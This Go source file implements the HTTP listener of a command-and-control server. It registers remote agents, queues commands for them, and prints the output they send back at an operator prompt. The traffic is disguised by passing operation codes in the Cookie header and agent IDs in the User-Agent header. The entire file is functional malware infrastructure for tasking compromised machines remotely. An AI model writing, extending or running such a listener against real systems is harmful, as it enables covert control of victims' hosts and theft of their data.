package c2

import (
	"encoding/json"
	"fmt"
	"github.com/brianvoe/gofakeit/v6"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"time"
)

type HttpListener struct {
	Ip         string
	Port       string
	errorLog   *log.Logger
	requestLog *log.Logger
}

func (h *HttpListener) checkInHandler(w http.ResponseWriter, r *http.Request) {
	h.requestLog.Printf("Time: %v, Method: %s, URL: %s, RemoteAddr: %s\n", time.Now(), r.Method, r.URL, r.RemoteAddr)
	gofakeit.Seed(0)
	noun := gofakeit.Noun()
	adj := gofakeit.Adjective()
	id := fmt.Sprintf("%s_%s", adj, noun)
	host, _, _ := net.SplitHostPort(r.RemoteAddr)

	AgentMap.Add(&Agent{
		Id:       id,
		Ip:       host,
		LastCall: time.Now(),
		CmdQueue: make([][]string, 0),
	})

	w.Write([]byte(id))
}

func (h *HttpListener) callBackHandler(w http.ResponseWriter, r *http.Request) {
	h.requestLog.Printf("Time: %v, Method: %s, URL: %s, RemoteAddr: %s\n", time.Now(), r.Method, r.URL, r.RemoteAddr)
	id := r.Header.Get("User-Agent")
	if agent := AgentMap.Get(id); agent != nil {
		agent.LastCall = time.Now()
		if CurrentAgent.Id == agent.Id {
			body, err := io.ReadAll(r.Body)
			if err != nil {
				return
			}
			r.Body.Close()
			fmt.Printf("\n[*] Agent called back, sent %d bytes\n", len(body))
			fmt.Println(string(body))
			fmt.Printf("C2 %s > ", CurrentAgent.Id)
			return
		} else {
			// TODO: Save to file
			return
		}
	}
	return
}

func (h *HttpListener) getTasksHandler(w http.ResponseWriter, r *http.Request) {
	h.requestLog.Printf("Time: %v, Method: %s, URL: %s, RemoteAddr: %s\n", time.Now(), r.Method, r.URL, r.RemoteAddr)
	id := r.Header.Get("User-Agent")
	if agent := AgentMap.Get(id); agent != nil {
		agent.LastCall = time.Now()
		if task, err := AgentMap.Dequeue(id); task != nil && err == nil {
			jsonData, err := json.Marshal(&task)
			if err != nil {
				return
			}
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			w.Write(jsonData)
			return
		} else {
			return
		}
	}
	return
}

func (h *HttpListener) handler(w http.ResponseWriter, r *http.Request) {
	if op := r.Header.Get("Cookie"); op != "" {
		switch op {
		case "id":
			{
				h.checkInHandler(w, r)
			}
		case "cmd":
			{
				h.getTasksHandler(w, r)
			}
		case "ret":
			{
				h.callBackHandler(w, r)
			}
		default:
			return
		}
	}
}

func (h *HttpListener) StartListener() {
	// Ensure the directory exists
	err := os.MkdirAll("c2/data", 0755) // Adjust the permissions as needed
	if err != nil {
		log.Fatalf("Error creating directories: %s", err.Error())
	}

	// open log file for listener
	logFile, err := os.OpenFile("c2/data/listener.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Error opening log file: %s", err.Error())
	}
	defer logFile.Close()

	h.errorLog = log.New(logFile, "ERROR: ", log.LstdFlags)
	h.requestLog = log.New(logFile, "REQUEST: ", log.LstdFlags)

	// init server with routing
	mux := http.NewServeMux()
	// register handlers
	mux.HandleFunc("/", h.handler)

	server := &http.Server{
		Addr:     fmt.Sprintf("%s:%s", h.Ip, h.Port),
		ErrorLog: h.errorLog,
		Handler:  mux,
	}

	// start listening
	err = server.ListenAndServe()
	if err != nil {
		h.errorLog.Fatalf("Server failed to start: %v", err)
	}
}
